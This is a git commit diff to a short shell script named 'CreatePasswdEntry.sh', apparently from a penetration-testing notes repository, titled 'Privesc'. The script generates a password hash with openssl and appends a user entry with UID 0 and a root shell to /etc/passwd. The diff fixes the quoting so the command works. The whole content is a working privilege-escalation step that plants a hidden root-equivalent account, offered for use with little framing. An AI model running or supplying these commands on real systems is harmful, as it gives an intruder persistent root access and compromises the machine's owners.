99b3266436c4a4bad142b34605d654ad36ff0651
Tom R <137434709+mr-tomr@users.noreply.github.com>
2023-12-24 15:34:04 -0500

    Privesc

--- CreatePasswdEntry.sh
+++ CreatePasswdEntry.sh
@@ -3,6 +3,7 @@
 # Manually create a user entry in /passwd for priv esc.
 # Openssl uses the "Crypt" algorithm to create this hash.
 # Append the user entry to /etc/passwd
+# If single quotes don't work, use double quotes or vice versa.
 
 # Generate Password String
 openssl passwd Password123
@@ -10,4 +11,4 @@ $1$fEuETrQK$yhBp6Y08qt4HbOPT52uyw1
 
 # Manually add password and user to /etc/passwd
 
-echo "red:$1$fEuETrQK$yhBp6Y08qt4HbOPT52uyw1:0:0:root:/root:/bin/bash" >> /etc/passwd
+echo 'red:$1$fEuETrQK$yhBp6Y08qt4HbOPT52uyw1:0:0:root:/root:/bin/bash' >> /etc/passwd
